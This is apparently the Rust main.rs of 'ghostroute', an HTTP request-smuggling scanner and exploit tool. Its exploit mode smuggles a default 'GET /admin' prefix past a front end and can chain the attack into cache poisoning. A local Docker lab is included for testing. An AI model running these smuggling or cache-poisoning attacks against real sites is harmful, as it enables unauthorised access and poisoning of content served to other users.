mod auth;
mod bypass;
mod checkpoint;
mod cli;
mod cve;
mod detect;
mod exploit;
mod net;
mod output;
mod scan;
mod update;

use chrono::Utc;
use clap::Parser;
use colored::*;

use cli::{Cli, Commands};
use output::{get_formatter, OutputFormatter, ScanReport, ScanResult, ScanSummary};

fn print_banner() {
    let banner = r#"
          __               __                   __     
   ____ _/ /_  ____  _____/ /__________  __  __/ /____ 
  / __ `/ __ \/ __ \/ ___/ __/ ___/ __ \/ / / / __/ _ \
 / /_/ / / / / /_/ (__  ) /_/ /  / /_/ / /_/ / /_/  __/
 \__, /_/ /_/\____/____/\__/_/   \____/\__,_/\__/\___/ 
/____/                                                  v1.0.2

                    [ Author : PwnedBytes0x1 ]
"#;
    println!("{}", banner.bright_yellow());
}

pub fn print_info(msg: &str) {
    eprintln!("  {} {}", "[INF]".bright_green(), msg);
}

pub fn print_det(msg: &str) {
    eprintln!("  {} {}", "[DET]".bright_cyan(), msg);
}

pub fn print_warn(msg: &str) {
    eprintln!("  {} {}", "[WARN]".bright_yellow(), msg);
}

pub fn print_err(msg: &str) {
    eprintln!("  {} {}", "[ERR]".bright_red(), msg);
}

pub fn print_dbg(msg: &str) {
    eprintln!("  {} {}", "[DBG]".bright_black(), msg);
}

#[tokio::main]
async fn main() {
    colored::control::set_override(true);
    let _ = rustls::crypto::CryptoProvider::install_default(
        rustls::crypto::ring::default_provider()
    );
    let cli = Cli::parse();

    match cli.command {
        Commands::Scan(args) => run_scan(args).await,
        Commands::Exploit(args) => run_exploit(args).await,
        Commands::Update(args) => run_update(args).await,
        Commands::Lab(args) => run_lab(args).await,
    }
}

async fn run_scan(args: cli::ScanArgs) {
    if !args.silent {
        print_banner();
    }

    // Auto-update check
    if args.auto_update {
    match update::check().await {
        Ok(update::UpdateStatus::Available { version, .. }) => {
            print_info(&format!("Update v{} available! Run `ghostroute update`", version));
        }
        Ok(update::UpdateStatus::UpToDate) => {
            if !args.silent {
                print_info("Already up to date");
            }
        }
        Ok(update::UpdateStatus::Error(e)) => {
            print_warn(&format!("Update check error: {}", e));
        }
        Err(e) => {
            print_warn(&format!("Update check failed: {}", e));
        }
    }
    }

    // Parse target(s)
    let targets: Vec<String> = if args.target == "-" {
        use std::io::{self, BufRead};
        let stdin = io::stdin();
        stdin
            .lock()
            .lines()
            .filter_map(|l| l.ok())
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    } else {
        vec![args.target.clone()]
    };

    if targets.is_empty() {
        print_err("No targets specified");
        return;
    }

    // Normalize targets (strip scheme, path, etc.)
    let targets: Vec<String> = targets.into_iter().map(|t| parse_target_to_host(&t)).collect();

    // Parse auth
    let mut auth = None;
    if let Some(cookie) = &args.cookie {
        let mut store = auth::AuthStore::from_cookie(cookie);
        let header_auth = auth::AuthStore::from_headers(&args.header);
        store.merge(&header_auth);
        auth = Some(store);
    } else if !args.header.is_empty() {
        auth = Some(auth::AuthStore::from_headers(&args.header));
    }

    // Parse port / TLS
    let (port, tls) = match args.port {
        Some(p) => (p, p == 443 || !args.no_tls),
        None => {
            if args.no_tls {
                (80, false)
            } else {
                (443, true)
            }
        }
    };

    // Resume from checkpoint
    let checkpoint = if let Some(path) = &args.resume {
        match checkpoint::Checkpoint::load(path) {
            Ok(cp) => {
                if !args.silent {
                    print_info(&format!(
                        "Resuming from checkpoint: {} targets completed, {} total probes",
                        cp.completed.len(),
                        cp.total_probes
                    ));
                }
                Some(cp)
            }
            Err(e) => {
                print_warn(&format!("Failed to load checkpoint: {}. Starting fresh", e));
                None
            }
        }
    } else {
        None
    };

    if !args.silent {
        print_info(&format!(
            "Scanning {} target(s) | Variant: {} | Concurrency: {} | Timeout: {}s",
            targets.len(),
            args.variant,
            args.concurrency,
            args.timeout,
        ));
    }

    let mut scan_results: Vec<ScanResult> = Vec::new();

    for target in &targets {
        print_info(&format!("Target:  {}:{}", target.bright_white(), port));
        eprintln!();

        let config = scan::ScanConfig {
            target: target.clone(),
            port,
            tls,
            timeout: args.timeout,
            concurrency: args.concurrency,
            variant: args.variant.clone(),
            auth: auth.clone(),
            proxy: args.proxy.clone(),
            checkpoint: checkpoint.clone(),
            checkpoint_interval: args.checkpoint_interval,
            silent: args.silent,
        };

        match scan::run_scan(config).await {
            Ok(results) => {
                let vuln_count = results.iter().filter(|r| r.vulnerable).count();
                scan_results.extend(results);

                if vuln_count > 0 {
                    print_det(&format!(
                        "{} variant(s) vulnerable on target",
                        vuln_count
                    ));
                }
            }
            Err(e) => {
                print_err(&format!("Scan failed for target: {}", e));
            }
        }
    }

    // Build report
    let timestamp = Utc::now().to_rfc3339();
    let total_checked = scan_results.len();
    let vulnerable_count = scan_results.iter().filter(|r| r.vulnerable).count();
    let not_vulnerable_count = scan_results.iter().filter(|r| !r.vulnerable).count();
    let errors = scan_results.iter().filter(|r| r.status_code == 0 && !r.vulnerable).count();

    let report = ScanReport {
        tool: "ghostroute".into(),
        version: "1.0.2".into(),
        author: "PwnedBytes0x1".into(),
        timestamp: timestamp.clone(),
        target: targets.join(", "),
        summary: ScanSummary {
            total_hosts: targets.len(),
            total_variants: scan_results.len(),
            vulnerable_count,
            not_vulnerable_count,
            errors,
        },
        results: scan_results,
    };

    // Output
    if args.json {
        for result in &report.results {
            println!("{}", output::json::jsonl_line(result));
        }
    } else if let Some(path) = &args.output {
        let format_name = if path.ends_with(".html") && args.output_format == "table" {
            "html"
        } else {
            &args.output_format
        };
        match get_formatter(format_name) {
            Ok(formatter) => {
                match formatter.format(&report) {
                    Ok(output) => {
                        match std::fs::write(path, &output) {
                            Ok(_) => {
                                if !args.silent {
                                    print_info(&format!("Report saved to {}", path));
                                }
                            }
                            Err(e) => {
                                print_err(&format!("Failed to write output: {}", e));
                                println!("{}", output);
                            }
                        }
                    }
                    Err(e) => print_err(&format!("Format error: {}", e)),
                }
            }
            Err(e) => print_err(&e),
        }
    } else {
        let formatter = output::table::TableFormatter;
        match formatter.format(&report) {
            Ok(output) => println!("{}", output),
            Err(e) => print_err(&format!("Format error: {}", e)),
        }
    }

    if !args.silent {
        print_info(&format!(
            "Scan complete | {} vulnerable | {} checked",
            vulnerable_count,
            total_checked
        ));
    }
}

async fn run_exploit(args: cli::ExploitArgs) {
    if !args.silent {
        print_banner();
    }

    let target = parse_target_to_host(&args.target);
    let (port, _tls) = (443, true);

    // Build prefix from file or interactive
    let prefix = if let Some(path) = &args.prefix_request {
        std::fs::read_to_string(path).unwrap_or_default().into_bytes()
    } else if args.interactive {
        print_info("Enter smuggled prefix (end with Ctrl+D):");
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).ok();
        input.into_bytes()
    } else {
        // Default prefix: grab /admin
        b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n".to_vec()
    };

    let suffix = if let Some(path) = &args.suffix_request {
        std::fs::read_to_string(path).unwrap_or_default().into_bytes()
    } else {
        b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n".to_vec()
    };

    let auth = if let Some(cookie) = &args.cookie {
        let mut store = auth::AuthStore::from_cookie(cookie);
        let header_auth = auth::AuthStore::from_headers(&args.header);
        store.merge(&header_auth);
        Some(store)
    } else if !args.header.is_empty() {
        Some(auth::AuthStore::from_headers(&args.header))
    } else {
        None
    };

    let auth_cache = auth.clone();

    let config = exploit::ExploitConfig {
        target: target.clone(),
        port: args.port.unwrap_or(port),
        tls: args.port.is_none_or(|p| p == 443),
        variant: args.variant.clone(),
        prefix,
        suffix,
        auth,
        count: args.count,
        delay: args.delay,
        proxy: args.proxy.clone(),
        timeout: args.timeout,
        json: args.json,
        silent: args.silent,
    };

    if !args.silent {
        print_info(&format!("Target:  {}", target.bright_white()));
        if args.chain.is_some() {
            print_info("Cache poisoning chain mode");
        }
        print_info(&format!("Exploiting via {} ({} attempts)", args.variant, args.count));
    }

    // Handle cache chain
    if let Some(chain) = &args.chain {
        let parts: Vec<&str> = chain.split("::").collect();
        if parts.len() == 2 {
            let cache_config = exploit::cache::CacheChainConfig {
                cache_url: parts[0].to_string(),
                cache_port: 443,
                origin_url: parts[1].to_string(),
                origin_port: 443,
                use_tls: true,
                auth: auth_cache.clone(),
                timeout: args.timeout,
            };
            match exploit::cache::attempt_cache_poison(&cache_config, &config.prefix, "/").await {
                Ok(result) => {
                    if result.success {
                        print_det(&format!("Cache poison succeeded! Path: {} (cache {})",
                            result.poisoned_path, result.cache_status));
                    } else {
                        print_warn("Cache poison attempt failed");
                    }
                }
                Err(e) => print_err(&format!("Cache poison error: {}", e)),
            }
            return;
        }
    }

    let results = exploit::run_exploit(&config).await;
    let success_count = results.iter().filter(|r| r.success).count();

    if !args.silent {
        if success_count > 0 {
            print_det(&format!("{} exploit attempts succeeded", success_count));
        } else {
            print_warn("No exploit attempts succeeded");
        }
    }

    if args.json {
        for r in &results {
            println!("{}", serde_json::to_string(r).unwrap_or_default());
        }
    }
}

async fn run_update(args: cli::UpdateArgs) {
    print_banner();
    print_info("Checking for updates...");

    match update::check().await {
        Ok(update::UpdateStatus::Available { version, download_url, checksum }) => {
            print_info(&format!("New version v{} available!", version));
            print_info(&format!("Download URL: {}", download_url));

            if args.force || ask_confirm("Download and install?") {
                let status = update::UpdateStatus::Available {
                    version,
                    download_url,
                    checksum,
                };
                match update::download_and_install(&status).await {
                    Ok(()) => print_info("Update complete! Restart ghostroute to use the new version."),
                    Err(e) => print_err(&format!("Update failed: {}", e)),
                }
            } else {
                print_info("Update cancelled");
            }
        }
        Ok(update::UpdateStatus::UpToDate) => {
            print_info("Already up to date");
        }
        Ok(update::UpdateStatus::Error(e)) => {
            print_err(&format!("Update error: {}", e));
        }
        Err(e) => {
            print_err(&format!("Update check failed: {}", e));
        }
    }
}

fn ask_confirm(prompt: &str) -> bool {
    use std::io::{self, Write};
    print!("{} [y/N]: ", prompt);
    io::stdout().flush().ok();
    let mut input = String::new();
    io::stdin().read_line(&mut input).ok();
    input.trim().eq_ignore_ascii_case("y")
}

async fn run_lab(args: cli::LabArgs) {
    let action = args.action.unwrap_or(cli::LabAction::Up);
    match action {
        cli::LabAction::Up => {
            print_info("Starting test lab...");
            let status = std::process::Command::new("docker-compose")
                .args(["-f", "lab/docker-compose.yml", "up", "-d"])
                .status();
            match status {
                Ok(s) if s.success() => print_info("Lab is running"),
                _ => print_warn("docker-compose not found. Install Docker and docker-compose."),
            }
        }
        cli::LabAction::Down => {
            print_info("Stopping test lab...");
            std::process::Command::new("docker-compose")
                .args(["-f", "lab/docker-compose.yml", "down"])
                .status()
                .ok();
            print_info("Lab stopped");
        }
        cli::LabAction::Test => {
            print_info("Running integration tests...");
            print_warn("Lab tests coming in P2");
        }
        cli::LabAction::Restart => {
            print_info("Restarting lab...");
            std::process::Command::new("docker-compose")
                .args(["-f", "lab/docker-compose.yml", "restart"])
                .status()
                .ok();
            print_info("Lab restarted");
        }
    }
}

fn parse_target_to_host(target: &str) -> String {
    let t = target.trim();
    // Strip scheme
    let without_scheme = if let Some(pos) = t.find("://") {
        &t[pos + 3..]
    } else {
        t
    };
    // Strip path/query/fragment
    let host_port = without_scheme.split('/').next().unwrap_or(without_scheme)
        .split('?').next().unwrap_or(without_scheme)
        .split('#').next().unwrap_or(without_scheme);
    host_port.to_string()
}
